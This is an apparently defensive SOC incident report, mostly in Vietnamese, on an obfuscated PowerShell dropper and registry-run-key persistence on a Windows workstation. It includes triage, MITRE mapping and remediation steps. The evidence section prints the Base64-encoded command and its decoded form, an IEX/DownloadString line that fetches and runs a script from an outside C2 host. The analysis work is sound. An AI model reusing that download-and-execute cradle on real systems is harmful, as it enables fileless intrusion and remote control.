# INCIDENT INVESTIGATION REPORT: INC-2026-003
## Windows Obfuscated PowerShell Execution & Registry Persistence

---

### 1. THÔNG TIN CHUNG (INCIDENT METADATA)
| Thông tin | Chi tiết |
| :--- | :--- |
| **Ticket ID** | INC-2026-003 |
| **Mức độ nghiêm trọng (Severity)** | **High (P2)** |
| **Trạng thái (Status)** | Contained / Endpoint Isolated |
| **Phân loại (Classification)** | **True Positive (TP - Malware Dropper & Persistence)** |
| **Người trực / Phân tích (Analyst)** | SOC Analyst Tier 1 |
| **Thời gian phát hiện** | 2026-10-29 14:30:15 (UTC+7) |
| **Hệ thống bị nhắm tới (Target)** | `WIN10-WORKSTATION` (IP: `192.168.1.150`, User: `CORP\victim_user`) |
| **Luật SIEM kích hoạt (Alert)** | Rule ID `100301` (Encoded PowerShell) & `100302` (Registry Run Key Modification) |

---

### 2. TÓM TẮT SỰ CỐ (EXECUTIVE SUMMARY)
Hệ thống SIEM tiếp nhận cảnh báo Sysmon Event ID 1 (Process Creation) trên máy trạm Windows 10 của nhân viên `victim_user`. Tiến trình `powershell.exe` được kích hoạt ở chế độ ẩn (`-w hidden`) với tham số `-enc` mang chuỗi Base64 dài để che giấu hành vi. Tiến trình cha khởi tạo là tệp `cmd.exe /c start_invoice.bat` nằm trong thư mục `Downloads`.

Tiếp theo sau đó 3 giây, Sysmon Event ID 13 ghi nhận khóa Registry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck` bị sửa đổi để trỏ tới tệp thực thi `C:\Users\Public\update.exe`.

Analyst đã tiến hành giải mã chuỗi Base64 sang văn bản UTF-16LE, phát hiện dòng lệnh độc hại tải tệp nhị phân từ máy chủ C2 ngoại biên `http://198.51.100.23/beacon.ps1`. Sau khi tra cứu bằng script `triage_ioc_checker.py`, mã hash và IP liên quan đều thuộc chiến dịch phát tán mã độc trojan. Cảnh báo được kết luận là **True Positive**. Máy trạm đã được cô lập khỏi mạng (Network Isolation) để ngăn chặn mã độc lây lan.

---

### 3. BẰNG CHỨNG LOG & BÓC TÁCH CHI TIẾT (EVIDENCE)

#### A. Sysmon Event ID 1 (Process Creation):
```json
{
  "EventID": 1,
  "Computer": "WIN10-WORKSTATION.corp.local",
  "User": "CORP\\victim_user",
  "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==",
  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
  "ParentCommandLine": "cmd.exe /c start_invoice.bat"
}
```

#### B. Giải mã chuỗi PowerShell Encoded (Base64 UTF-16LE):
- **Chuỗi gốc:**
  `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==`
- **Kết quả giải mã ra lệnh rõ:**
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/beacon.ps1')
  ```
- **Phân tích hành vi:** Lệnh sử dụng `Net.WebClient.DownloadString` kết hợp `IEX` (Invoke-Expression) để tải mã PowerShell độc hại trực tiếp vào bộ nhớ RAM mà không cần lưu xuống đĩa (kỹ thuật Fileless Attack/In-memory Execution).

#### C. Sysmon Event ID 13 (Registry Modification - Persistence):
```text
EventID: 13 (RegistryValueSet)
TargetObject: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck
Details: C:\Users\Public\update.exe
```
Kẻ tấn công mạo danh tên tiến trình `WindowsUpdateCheck` để duy trì quyền điều khiển máy trạm ngay cả khi người dùng khởi động lại máy.

---

### 4. KẾT QUẢ THREAT INTEL TỪ SCRIPT TRIAGE
Thực thi lệnh kiểm tra IOC:
```bash
python scripts/triage_ioc_checker.py -i 198.51.100.23
```
- **AbuseIPDB:** Điểm nguy hại 100%, ghi nhận nguồn phát tán botnet/C2.
- **VirusTotal:** 58/72 hãng bảo mật nhận diện URL/Hash chứa payload Trojan:PowerShell/RevShell hoặc Cobalt Strike Beacon.

---

### 5. MITRE ATT&CK MAPPING
| Tactic | Technique ID | Tên kỹ thuật | Hành vi cụ thể trong log |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1059.001` | PowerShell | Chạy fileless script qua powershell.exe |
| **Defense Evasion** | `T1027` | Obfuscated Files or Information | Mã hóa Base64 chuỗi command line |
| **Persistence** | `T1547.001` | Registry Run Keys / Startup Folder | Ghi khóa khởi động tại `HKCU\...\Run` |

---

### 6. QUY TRÌNH XỬ LÝ CỦA TIER 1 (CONTAINMENT & REMEDIATION)
1. **Cô lập máy trạm (Host Isolation):** Ngắt kết nối mạng của `WIN10-WORKSTATION` (thông qua lệnh cách ly EDR hoặc ngắt cổng switch) để chặn kết nối C2 tới `198.51.100.23`.
2. **Tiêu diệt tiến trình độc hại:**
   - Dừng PID `4892` (powershell.exe) và các tiến trình con.
3. **Gỡ bỏ cơ chế tự khởi động (Eradication):**
   - Xóa khóa Registry độc hại:
     ```cmd
     reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f
     ```
   - Xóa tệp thực thi độc hại: `C:\Users\Public\update.exe` và `C:\Users\victim_user\Downloads\start_invoice.bat`.
4. **Bàn giao Tier 2:** Chuyển ticket kèm mẫu file hash để rà soát toàn bộ các máy trạm khác trong cùng dải mạng phòng Kế toán xem có ai nhận email chứa tệp `start_invoice.bat` tương tự hay không.

